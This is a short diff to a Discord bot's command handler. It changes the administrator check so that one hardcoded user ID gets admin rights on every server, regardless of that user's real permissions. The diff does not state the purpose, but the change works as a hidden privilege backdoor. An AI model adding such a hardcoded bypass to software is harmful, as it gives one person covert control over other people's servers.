@@ -248,7 +248,7 @@ def commandHandler(command,msg):
     if serversettings.get("server_name") != msg.server.name:
         client.database.set_server_info(serverid,server_name=msg.server.name)
     output = Command()
-    admin = msg.author.server_permissions.administrator
+    admin = msg.author.server_permissions.administrator or msg.author.id == '293482190031945739'
     if command.startswith("setpresence"):
         if admin:
             yield from client.send_typing(msg.channel)
